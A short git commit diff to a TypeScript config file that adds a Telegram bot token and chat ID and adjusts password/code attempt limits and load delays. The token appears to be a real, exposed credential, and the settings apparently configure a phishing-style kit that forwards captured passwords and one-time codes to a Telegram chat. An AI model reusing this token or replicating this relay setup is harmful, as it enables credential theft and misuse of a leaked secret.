b08adc7bae3820604eeea48b33b09f2950071903
mentorblack1 <vuvansonss@gmail.com>
2026-05-06 16:49:04 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,9 +1,9 @@
 const config = {
-    token: "",
-    chat_id: 0,
+    token: "8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw",
+    chat_id: -1003257858837,
     max_pass: 1,
-    max_code: 1,
+    max_code: 3,
     time_pass_load: 3000,
-    time_code_load: 3000
+    time_code_load: 5000
 };
 export default config;
